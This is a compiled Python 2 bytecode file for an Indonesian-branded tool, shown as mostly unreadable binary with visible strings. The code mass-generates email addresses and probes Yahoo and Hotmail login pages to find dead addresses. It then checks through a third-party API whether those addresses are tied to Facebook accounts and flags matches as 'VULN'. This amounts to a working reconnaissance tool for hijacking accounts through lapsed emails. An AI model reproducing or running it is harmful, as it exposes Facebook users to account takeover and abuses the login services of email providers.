ó
Í1õ^c           @   sP  d  d l  m Z d  d l Z d  d l Z d  d l Z d a d a e d d  a d   Z	 d   Z
 d   Z i  Z d	 GHe d
  Z e d k r d e d <n# e d k r³ d e d <n
 e d  d GHe d
  Z e d k rç d e d <nU e d k r d e d <n< e d k rd e d <n# e d k r2d e d <n
 e d  d GHe d
  Z e d k re d  Z e d  a e e d <d e d <t e d <d Z n5 e d k rÃe d   a t e d! <d" Z n
 e d  d# GHe j e d$ e j   Z d Z g  Z yW xP e d$ D]D Z e d% 7Z e e  d& e e d'  GHe j e e d'   qWWn e d(  n Xd# GHe d d k re d)  j e
 e  t j   n3 e d d k rÏe d)  j e	 e  t j   n  g  Z x0 e d d*  j   D] Z e j e j     qëWe! e  d k r'e d+  n  d, GHe d)  j e e  e d-  d S(.   iÿÿÿÿ(   t
   ThreadPoolNi    s   email_mati.txtt   wc         C   s   y t  d 7a  t j d |   } t j d | j  d } | d k ri t j t |   d  t	 d 7a	 n  t
 j j d j t  t t	   Wn n Xd  S(   Ni   s!   https://login.live.com/?username=s   "IfExistsResult":(.*?)},i    t   1s   
s   ({0}\{1}) Email mati:-{2}   (   t   loopt   requestst   gett   ret   findallt   textt   filet   writet   strt   diet   syst   stdoutt   formatt   jumlah(   t   emailt   responset   cek(    (    s   both.pyt   hotmail   s    
# c         C   s  yt  d 7a  t j   } | j d  } | j j   } t j d | j  d } t j d | j  d } i |  d 6| d 6| d 6} i d	 d
 6} | j	 d d | d | d | j } d t
 |  k rë t j t
 |   d  t d 7a n  t j j d j t  t t   Wn n Xd  S(   Ni   s$   https://login.yahoo.com/config/logins   name="acrumb" value="(.*)"i    s!   name="sessionIndex" value="(.*?)"t   usernamet   acrumbt   sessionIndext   XMLHttpRequests   X-Requested-Witht   datat   cookiest   headerss   /account/challenge/recaptchas   
s   ({0}\{1}) Email mati:-{2}   (   R   R   t   sessionR   R   t   get_dictR   R   R   t   postR   R	   R
   R   R   R   R   R   (   R   t   sR   R   R   R   t   paramsR   (    (    s   both.pyt   yahoo   s     
$# c         C   sµ   y§ i d d 6d d 6d d 6d d 6d	 d
 6} t  j d d i |  d 6d | j   } | d } | d } | d k r¦ d t |  d t |  d t |   d GHn  Wn n Xd  S(   Ns   Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30s
   User-AgentR   s   X-Requested-Withs.   application/json, text/javascript, */*; q=0.01t   Accepts(   https://nabil.my.id/Fb_Checker_UID_Emailt   Referers0   application/x-www-form-urlencoded; charset=UTF-8s   Content-Types(   https://nabil.my.id/api/fbcheckinfoemailR   R   R   t   namat   uids	   Tidak Adas   VULN => t   |t    (   R   R   t   jsonR   (   R   R   R   R$   R%   (    (    s   both.pyt
   fbvalidate*   s    
(

6 sJ   
ð¹âð¹ R E V O L U T I O N . I D ð¹âð¹

 1. Yahoo
 2. Hotmail
s   >> R   s	   yahoo.comt   domaint   2s   hotmail.coms   Pilihan tidak ada!sd   
âK A R A K T E Râ

 1. (-) Strip
 2. (_) Garis bawah
 3. (none) Tanpa karakter
 4. (-, _) Acak
t   -t   karaktert   _t   3t   nonet   4t   acaksD   
V E R S I

 1. Email generator versi 1
 2. Email generator versi 2
s   
Nama pengguna: s   Jumlah: R$   t   n_awalt   n_akhirs-   https://dz-tools.my.id/api/email-generator/v1s	   
Jumlah: R   s-   https://dz-tools.my.id/api/email-generator/v2R'   R   i   s   . R   t   Errori   t   rs   

Tidak ada email mati.s&   

Mulai memvalidasi email facebook...
s   
[Program Finished]("   t   multiprocessing.poolR    R   R   R   R   R   t   openR	   R   R!   R)   R    t	   raw_inputt   pilt   exitR$   R   t   urlR   R(   R   t   totalR   t   xR   t   appendt   mapt   closet   fbt	   readlinest   it   stript   len(    (    (    s   both.pyt   <module>   s   $			
	



	
	

 